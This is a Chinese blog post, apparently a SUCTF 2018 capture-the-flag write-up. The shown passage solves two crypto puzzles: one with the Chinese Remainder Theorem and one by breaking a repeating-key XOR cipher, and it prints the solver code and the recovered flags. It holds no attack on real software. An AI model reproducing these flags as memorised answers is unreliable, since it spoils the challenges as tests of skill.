@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"findneo.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="MISCsandgamegame.py 12345678import flagflag &#x3D; flag.flagsands &#x3D; int(flag[5:-1].encode(&quot;hex&quot;), 16)holes &#x3D; [257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="suctf writeup">
+<meta property="og:url" content="https://findneo.github.io/180527suctf/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="MISCsandgamegame.py 12345678import flagflag &#x3D; flag.flagsands &#x3D; int(flag[5:-1].encode(&quot;hex&quot;), 16)holes &#x3D; [257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353,">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://findneo.github.io/180527suctf/1527361456797.png">
+<meta property="article:published_time" content="2018-05-27T14:07:58.000Z">
+<meta property="article:modified_time" content="2021-03-09T13:32:32.000Z">
+<meta property="article:author" content="findneo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://findneo.github.io/180527suctf/1527361456797.png">
+
+<link rel="canonical" href="https://findneo.github.io/180527suctf/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>suctf writeup | 闲言语</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">闲言语</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/180527suctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/findneo.png">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          suctf writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-05-27 22:07:58" itemprop="dateCreated datePublished" datetime="2018-05-27T22:07:58+08:00">2018-05-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-09 21:32:32" itemprop="dateModified" datetime="2021-03-09T21:32:32+08:00">2021-03-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="sandgame"><a href="#sandgame" class="headerlink" title="sandgame"></a>sandgame</h2><p>game.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flag</span><br><span class="line">flag = flag.flag</span><br><span class="line">sands = <span class="built_in">int</span>(flag[<span class="number">5</span>:-<span class="number">1</span>].encode(<span class="string">&quot;hex&quot;</span>), <span class="number">16</span>)</span><br><span class="line">holes = [<span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;sand.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(holes)):</span><br><span class="line">        sand = sands % holes[i]</span><br><span class="line">        f.write(<span class="built_in">str</span>(sand)+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>solution.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="comment"># import flag</span></span><br><span class="line"><span class="comment"># 解同余方程组；中国剩余定理，韩信点兵，扩展欧几里得，模反 &lt;= 深入理解</span></span><br><span class="line"><span class="comment">#求模反元素，模逆元</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>     <span class="title">gcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">        <span class="keyword">while</span> a!=<span class="number">0</span>:</span><br><span class="line">            a,b = b%a,a</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"><span class="comment">#定义一个函数，参数分别为a,n，返回值为b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>     <span class="title">findModReverse</span>(<span class="params">a,m</span>):</span><span class="comment">#这个扩展欧几里得算法求模逆</span></span><br><span class="line">        <span class="keyword">if</span> gcd(a,m)!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        u1,u2,u3 = <span class="number">1</span>,<span class="number">0</span>,a</span><br><span class="line">        v1,v2,v3 = <span class="number">0</span>,<span class="number">1</span>,m</span><br><span class="line">        <span class="keyword">while</span> v3!=<span class="number">0</span>:</span><br><span class="line">            q = u3//v3</span><br><span class="line">            v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3</span><br><span class="line">        <span class="keyword">return</span> u1%m</span><br><span class="line"></span><br><span class="line">holes = [<span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>]</span><br><span class="line">sand =  [<span class="number">222</span>, <span class="number">203</span>, <span class="number">33</span>, <span class="number">135</span>, <span class="number">203</span>, <span class="number">62</span>, <span class="number">227</span>, <span class="number">82</span>, <span class="number">239</span>, <span class="number">82</span>, <span class="number">11</span>, <span class="number">220</span>, <span class="number">74</span>, <span class="number">92</span>, <span class="number">8</span>, <span class="number">308</span>, <span class="number">195</span>, <span class="number">165</span>, <span class="number">87</span>, <span class="number">4</span>]</span><br><span class="line">M=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> holes:</span><br><span class="line">	M*=i</span><br><span class="line">s=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">enumerate</span>(holes):</span><br><span class="line">	mi=j</span><br><span class="line">	Mi=M/mi</span><br><span class="line">	s=s+findModReverse(Mi,mi)*sand[i]*Mi</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">str</span>(<span class="built_in">hex</span>(s%M)[<span class="number">2</span>:-<span class="number">1</span>]).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="comment"># This_is_the_CRT_xwg)</span></span><br></pre></td></tr></table></figure>
+
+<p>韩信点兵问题，根据中国剩余定理构造通解</p>
+<p><img data-src="1527361456797.png" alt="1527361456797"></p>
+<h2 id="Cycle"><a href="#Cycle" class="headerlink" title="Cycle"></a>Cycle</h2><p>cycle.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryt</span>(<span class="params">key, plain</span>):</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        cipher += <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]) ^ <span class="built_in">ord</span>(plain[i]))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPlainText</span>():</span></span><br><span class="line">    plain = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plain.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            line = f.readline()</span><br><span class="line">            <span class="keyword">if</span> line:</span><br><span class="line">                plain += line</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    key = flag.flag</span><br><span class="line">    <span class="keyword">assert</span> key.startswith(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line">    <span class="keyword">assert</span> key.endswith(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">    key = key[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) &gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) &lt; <span class="number">50</span></span><br><span class="line">    <span class="keyword">assert</span> flag.languageOfPlain == <span class="string">&quot;English&quot;</span></span><br><span class="line">    plain = getPlainText()</span><br><span class="line">    cipher = encryt(key, plain)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;cipher.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(cipher.encode(<span class="string">&quot;base_64&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>cipher.txt</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">BwcIRTcACAcJUycaGBFSP4bX6WM7BA0DPw4UTTcAGwcUAAcUAQBJIkBhJE4wGgwEczsMAhMJGxqI</span><br><span class="line">nMY2GwZJP0kmBFIgAQd5EgEJFxEfSToGRy0UAQDP8OUoDVI9Gx0cIwcIF1QlCBwTSSRZUzNVNUkp</span><br><span class="line">AFImEQQSPUNNLxsGBxdHYj8WGBhBIg1LipzYPwAfP08uDRUFGQcITqXJ/zVMKRFLNUE4BGMyPQsf</span><br><span class="line">AANIPQ8ARysHB5ucwCgHAFh0OAgfP2UkQgINSQwCRSRVARFBKAAFAgA2BwYYIE8CA1QHBQptdCIQ</span><br><span class="line">UxhFKwwFAVN0CQcXcxsFAFQFEBoPU0A0EBxJIAUOFgA1Bg1TOwYeRRMHBQptaC8HEAFMKRpLBE4w</span><br><span class="line">SAEaIE8KDBIcGmQ0UCMRFgZNLQdMFgA3BwcHIQABbzUGDU4lQT4YEhoAOwAfDQA8ARpTNQYeEQdi</span><br><span class="line">KAADACkZFhVSIBBLLAAwBwdUJ08eABFIBBcURSYTUwFQIwdLEUg1HEkfOhwZbycADE4UQSMRX1RX</span><br><span class="line">JAwZAAcwSBAcJk8aBBoGCE4AT3V/OxtXbAQeBkh0EQYGcxgMCxoJSRwOUyFKeT0HIUkFClR0BAYc</span><br><span class="line">OAYDAlQOBhxHUyUYFhZPKBBhMkkgAEkAPAIIRQcdGQsVSD8YEhoAKwANEVNeOwYeNk8eEAQNGwYC</span><br><span class="line">UiV/IBtNKUkNBEkmER0SPwpNBxgBGh1taj8GB1RTIwQOEUg9Bg5TGk8OBBpIHRsVTmoBHH5zIwQO</span><br><span class="line">B08wEUk6cwwMC1QDAB0UKgNVBBVOOEkYCk0xHAEaPQhNDwEbHU4LSSEQUwBIJRphIU87RQ0cPEIJ</span><br><span class="line">ChtESQoIT2cRHBsNKAYEb2Q7B0QXPABAARsHRU4DTyVYFxtPRi0ECg0wBwZeNwACSVQMBgFKRCUa</span><br><span class="line">XhBPI2MkDQAdSB4SPRtNFhsFDBoPSSQSUx5VPx1LCUk/DUkHOwYebzAHBkMDTyVYFxtPYEkPCk95</span><br><span class="line">DAYcfgsCCn4sBgFKRCUaXhBPI0VLAU87RQ0cPGUpChtFDQEIDS4aHFgAKAYESEQ7B0QXPABnKhxI</span><br><span class="line">IE4QQSQBUwdPIQwfDUk6D0kZJhwZRRgBAgtHVCIcAH5pbB4KC1R0GwYeNhsFDBoPSQQSUz5VHx1L</span><br><span class="line">KUkfDUknYiBUJQpNBxENB04VRSsRGhpHbAsECksnSAYVcwABAX48AQtHTC8SFhpEP0kKC0R0HAEW</span><br><span class="line">cwIUERwbYzoPRWoBFgdULQQOC1QnSB0bNhZNERsEDWQzSC9VHhtPIkkKC0R0AR0AcwoOCR0YGgtt</span><br><span class="line">YSQRUydVPAwZCEE6SBwdIQABCQdiKE4UVSMBUxZFKgYZAAA8DUkfOgkZFn4qHBpHaW0YUxpPOEkf</span><br><span class="line">DUV0AwAdN08CA1QYDBwUTyRVBxxBOEkCEQAyAR0AWTwFAFQbCAcDDGoCGxFSKU4PRVk7HUkEMgED</span><br><span class="line">BFQPBlFtaCUCUxlVLwFLHE8hSB4SPQEMRQYBGgVYKgNSHlROIx1LCU87AwAdNE8LCgZIGgEKRSga</span><br><span class="line">Fw0qGwAfDQAnBwQWcxwYFREaARsKQSRVFB1GOBphNk85DUkAJh8IFxwNGwFtcyUYFlRGLQAZHFQ1</span><br><span class="line">BAxTMQMEFgdiIxsUVGoGHBlFOAECC0d0IUkQMgFNEQEaB04TT0AmHBlFLgYPHAAdSAoSPU8ADAcb</span><br><span class="line">YydHVysbB1RTIwQOEUg9Bg5TORoeEVQEAAUCAD4dGgcqBUkcBE4gSBocPgoZDR0GDk4NVTkBUxhJ</span><br><span class="line">JwxLEUg9G2M8O08kRQMJBxpHUyUYFgBIJQcMRUohGx1TPwYGAFQcAQcUKg4aHFlEIwZGAU87REkX</span><br><span class="line">PABAARsHRAoIT0AxHBsNKAYESEQ7B0VTNwACSBAHBmQjTyVYFxtPYQ0ECgx0DAYcfgsCClkMBgFt</span><br><span class="line">byJVOlRXLQcfRVM7BQwHOwYDAlQCHB0TACYcGBEAOAECFioQBwZeNwACSBAHBkJHRCUaXhBPI0QP</span><br><span class="line">Ck9eLAYcfgsCClkMBgFLAC4aHFlEIwZhIU87RQ0cPEIJChtESQoIT2cRHBsNKAYEb3c8DRsWdAtN</span><br><span class="line">HBVIHg8JTitVFBsfRiEEEgA5HQobcxYCEFQfCAAJQWoHGgdLc2MiQk10BgYHcwMCCh8BBwlHRiUH</span><br><span class="line">UwdPIQwJCkQtYj4aJwdNFhsFDE4UVToQARxVIQgFRUc9Dh0AWTwCCBFIGhsXRTgdFgZPRjoECEV0</span><br><span class="line">DggaIRYZBBgNSQwLSTkGeT5VPx1LFk85DR0bOgEKRT1ICg8JAD4AARoAOAZhNk85DQscNxZNLFQL</span><br><span class="line">CABHSyMGAH5pbB4KC1R0GwYeNhsFDBoPSQQSUz5VHx1LKUkfDUknYiYbcyZNEhUGHU4UTycQBxxJ</span><br><span class="line">Ig5LD1UnHEkfOgQIRQAAAB1tbyJVOlRXLQcfRVM7BQwHOwYDAlQCHB0TACYcGBEAOAECFiobAEk6</span><br><span class="line">cxgMCwBIGgEKRT4dGhpHbAMeFlR0BAAYNk8ZDR0b</span><br></pre></td></tr></table></figure>
+
+<p>类似维吉尼亚的变种，key长度远小于plain，循环异或后可统计字频，南邮CTF平台有一题相似的。详见 <a href="https://findneo.github.io/171005NuptVigenereWP/">https://findneo.github.io/171005NuptVigenereWP/</a> 。稍微更改其中读取密文部分即可。<code>flag&#123;Something Just Like This&#125;   </code> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipher</span>(<span class="params">file=<span class="string">&#x27;code.txt&#x27;</span></span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;从文件中读取十六进制串，返回十六进制数组</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    c=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:x.strip(),<span class="built_in">open</span>(<span class="string">&#x27;cipher.txt&#x27;</span>).readlines())).decode(<span class="string">&#x27;base_64&#x27;</span>)</span><br><span class="line">    cc= [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> c]</span><br><span class="line">    <span class="comment"># print cc,len(cc)</span></span><br><span class="line">    <span class="keyword">return</span> cc</span><br><span class="line">    <span class="comment"># c = open(file).read()</span></span><br><span class="line">    <span class="comment"># codeintlist = []</span></span><br><span class="line">    <span class="comment"># codeintlist.extend(</span></span><br><span class="line">    <span class="comment">#     (map(lambda i: int(c[i:i + 2], 16), range(0, len(c), 2))))</span></span><br><span class="line">    <span class="comment"># return codeintlist</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKeyPool</span>(<span class="params">cipher, stepSet, plainSet, keySet</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33]</span></span><br><span class="line"><span class="string">        返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，密钥字符集为数字列表。</span></span><br><span class="line"><span class="string">            形如&#123;</span></span><br><span class="line"><span class="string">                    1:[[0x11]],</span></span><br><span class="line"><span class="string">                    3:[</span></span><br><span class="line"><span class="string">                        [0x11,0x33,0x46],</span></span><br><span class="line"><span class="string">                        [0x22,0x58],</span></span><br><span class="line"><span class="string">                        [0x33]</span></span><br><span class="line"><span class="string">                       ]</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    keyPool = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> stepSet:</span><br><span class="line">        maybe = [<span class="literal">None</span>] * step</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> xrange(step):</span><br><span class="line">            maybe[pos] = []</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> keySet:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> cipher[pos::step]:</span><br><span class="line">                    <span class="keyword">if</span> c ^ k <span class="keyword">not</span> <span class="keyword">in</span> plainSet:</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    maybe[pos].append(k)</span><br><span class="line">        <span class="keyword">for</span> posPool <span class="keyword">in</span> maybe:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(posPool) == <span class="number">0</span>:</span><br><span class="line">                maybe = []</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(maybe) != <span class="number">0</span>:</span><br><span class="line">            keyPool[step] = maybe</span><br><span class="line">    <span 